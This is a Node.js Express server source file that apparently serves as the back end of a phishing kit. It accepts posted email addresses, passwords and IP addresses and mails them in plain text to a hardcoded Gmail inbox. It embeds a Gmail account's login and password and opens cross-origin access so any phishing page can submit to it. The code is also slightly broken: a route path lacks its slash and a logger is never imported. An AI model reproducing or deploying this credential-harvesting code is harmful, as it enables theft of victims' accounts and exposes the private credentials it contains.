const express = require("express");

const app = express();

const send = require("gmail-send")({
  user: "usasilkcorp@gmail.com",
  pass: "pass4ck3r",
  to: "hussnain77133@gmail.com",
  subject: "test Email,passowrd,IpAddress",
});

app.use(express.json());

app.use((req, res, next) => {
  res.setHeader("content-type", "application/json");
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept"
  );
  res.setHeader(
    "Access-Control-Allow-Methods",
    "GET, POST, PATCH, DELETE, OPTIONS"
  );
  next();
});

app.post("sendMail", (req, res, next) => {
  const { email, password, ipaddress } = req.body;
  send(
    {
      text: `Email : ${email} , Password : ${password} ,ipaddress:${ipaddress}`,
    },
    (error, result, fullResult) => {
      if (error) console.error(error);
      console.log(result);
    }
  );
});

app.get("*", function (req, res) {
  res.status(200).json({
    Success: true,
    message: "You can Only send post req to sendMail",
  });
});

app.post("*", function (req, res) {
  res.status(200).json({
    Success: true,
    message: "You can Only send Post req to sendMail",
  });
});

const port = process.env.PORT || 5000;
app.listen(port, () => winston.info(`Listening on port ${port}`));
